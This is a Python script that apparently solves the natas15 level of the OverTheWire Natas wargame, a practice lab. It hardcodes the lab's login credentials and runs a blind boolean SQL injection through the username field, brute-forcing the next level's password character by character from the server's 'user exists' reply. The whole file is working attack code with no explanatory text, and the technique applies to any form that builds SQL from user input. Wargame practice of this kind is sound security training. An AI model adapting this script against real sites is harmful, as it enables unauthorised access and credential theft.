#!/bin/python

import requests

letters='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
url='http://natas15.natas.labs.overthewire.org/index.php'
auth=('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
payload='natas16" and password like binary "' 
end='%'
password=''

while len(password) != 32:
    for letter in letters:
        data=''
        username_data = payload + password + letter + end
        data = {'username':username_data}
        response = requests.post(url, data=data, auth=auth)
        if 'This user exists.' in response.text:
            password += letter
            print('Size: ' + str(len(password)) + ' -> ' + password)
            break
print("Password cracked: " + password)
